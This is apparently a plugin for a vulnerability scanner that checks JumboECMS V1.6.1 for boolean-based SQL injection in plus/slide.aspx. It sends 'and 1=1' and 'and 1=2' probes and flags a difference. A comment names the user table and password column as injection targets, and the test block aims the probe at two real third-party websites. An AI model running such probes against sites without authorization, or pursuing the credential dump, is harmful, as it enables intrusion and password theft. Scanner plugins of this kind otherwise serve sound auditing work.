#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:JumboECMS V1.6.1 注入漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2010-062717
#注入表名 jcms_normal_user  列名UserName 和 UserPass



def assign(service,arg):
    if service=="jumboecms":
        return True,arg 

def  audit(arg):
    url=arg+"plus/slide.aspx?id=1%20and%201=1"
    url2=arg+"plus/slide.aspx?id=1%20and%201=2"
    code,head,res,errcode,_=curl.curl2(url)
    code2,head2,res2,errcode,_=curl.curl2(url2)
    if code!=0 and code2!=0 and res != res2:
        security_hole(url)
        
if __name__=="__main__":
    from dummy import *
    
    audit(assign('jumboecms','http://www.ruibide.com/')[1])
    audit(assign('jumboecms','http://www.hx123.com.cn/')[1])